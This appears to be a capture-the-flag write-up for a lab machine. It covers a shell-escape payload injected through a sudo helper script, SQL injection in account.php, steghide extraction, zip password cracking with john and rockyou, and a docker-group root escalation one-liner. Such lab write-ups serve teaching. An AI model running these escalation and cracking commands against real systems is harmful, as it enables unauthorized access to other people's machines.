Nothing else in ftp, so I guess two usernames is all i'm getting for now.

So we can run commands as apaar, therefore the local flag is probably related to this user:

ls -lah /home/apaar/

Here we have local.txt, but we don't have permission to cat this out:

So we do:

www-data@ip-10-10-106-225:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh
Welcome to helpdesk. Feel free to talk to anyone at any time!

Now, in the message, put this payload:

/usr/bin/script -qc /bin/bash /dev/null

and cat /home/apaar/local.txt to get the flag.

The website is vulnerable to SQL injection, as we can see from account.php file, where there is no filter or sanitization on input, therefore this can be exploited using simple sqli payloads.

I downloaded the image and used steghide to find backup.zip:

steghide extract -sf hacker-with-laptop_23-2147985341.jpg

Since the zip requires a password, I used zip2john (flashback to Bitdefender CTF qualifications):

zip2john backup.zip > backup.hash

Then crack it using john:

john backup.hash --wordlist=rockyou.txt

Unzip the file and we have a php script in which there is an user - Anurodha - and a password, which needs to be decoded from Base64.

su to Anurodha, enter the password and use the following one-liner from GTFOBins to get a root shell (since this user is in the docker group):

docker run -v /:/mnt --rm -it alpine chroot /mnt sh
